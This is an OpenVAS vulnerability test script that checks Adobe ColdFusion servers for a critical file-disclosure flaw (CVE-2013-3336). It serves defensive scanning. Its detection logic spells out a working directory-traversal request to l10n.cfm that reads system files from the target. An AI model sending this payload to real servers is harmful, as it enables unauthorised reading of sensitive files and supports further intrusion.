###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_coldfusion_59773.nasl 11 2013-10-27 10:12:02Z jan $
#
# Adobe ColdFusion  Information Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Adobe ColdFusion is prone to an information-disclosure vulnerability.

Attackers can exploit this issue to retrieve files stored on the
server and obtain sensitive information. This may aid in launching
further attacks.";


tag_solution = "Apply the patch from below link,
http://helpx.adobe.com/coldfusion/kb/coldfusion-security-hotfix-apsb13-13.html";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103709";
CPE = "cpe:/a:adobe:coldfusion";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(59773, 59849);
 script_cve_id("CVE-2013-3336", "CVE-2013-1389");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_tag(name:"risk_factor", value:"Critical");
 script_version ("$Revision: 11 $");

 script_name("Adobe ColdFusion  Information Disclosure Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name:"URL", value:"http://www.securityfocus.com/bid/59773");
 script_xref(name:"URL", value:"http://www.adobe.com/products/coldfusion/");
 script_xref(name:"URL", value:"http://www.adobe.com/support/security/bulletins/apsb13-13.html");

 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-05-10 11:21:00 +0200 (Fri, 10 May 2013)");
 script_description(desc);
 script_summary("Determine if LFI is possible");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("gb_coldfusion_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("coldfusion/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(! port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

files = traversal_files();

foreach file (keys(files)) {

  url = "/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=../../../../../../../../../../../../../../../" + 
        files[file] + "&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisT" + 
        "ag.generatedContent=htp";

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_warning(port:port);
    exit(0);

  }

}  

exit(99);

